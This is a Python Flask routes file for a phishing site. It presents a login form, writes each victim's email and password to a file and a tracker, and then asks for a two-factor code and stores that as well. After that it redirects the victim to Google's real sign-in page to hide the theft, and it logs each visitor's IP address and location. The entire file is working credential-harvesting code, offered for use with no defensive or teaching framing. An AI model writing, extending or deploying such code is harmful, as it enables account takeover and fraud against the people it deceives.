from flask import Request, render_template, request, redirect
from .tracker import log_credentials
import json
from datetime import datetime


def init_routes(app):
    @app.route('/')
    def index():
        return render_template('login.html')

    @app.route('/login', methods=['POST'])
    def login():
        email = request.form.get('email')
        password = request.form.get('password')
        user_agent = request.headers.get('User-Agent')
        ip = request.remote_addr

        log_credentials(email, password, user_agent, ip)
        with open("creds.txt", "a") as file:
            file.write(f"{email} | {password}\n")

        return render_template("2fa.html")
    @app.route('/verify-code', methods=['POST'])
    def verify_code():
        code = request.form.get('code')

        with open("creds.txt", "a") as file:
            file.write(f"2FA Code: {code}\n")

        return redirect("https://accounts.google.com/")
    

    @app.route('/log-info', methods=['POST'])
    def log_info():
        data = request.get_json()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get IP address
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip = request.remote_addr

        data["client_ip"] = ip

    # Query ipinfo.io using server IP
        try:
            token = "your_ipinfo_token_here"  # Optional
            url = f"https://ipinfo.io/{ip}/json"
            if token:
                url += f"?token={token}"

            ip_info = Request.get(url).json()

            data.update({
                "ip": ip_info.get("ip", ""),
                "city": ip_info.get("city", ""),
                "region": ip_info.get("region", ""),
                "country": ip_info.get("country", ""),
                "loc": ip_info.get("loc", ""),
                "org": ip_info.get("org", "")
            })
        except Exception as e:
            print("IP info fetch failed:", e)

        with open("visitor_logs.txt", "a") as file:
            file.write(f"[{timestamp}] {json.dumps(data)}\n")

        return '', 204
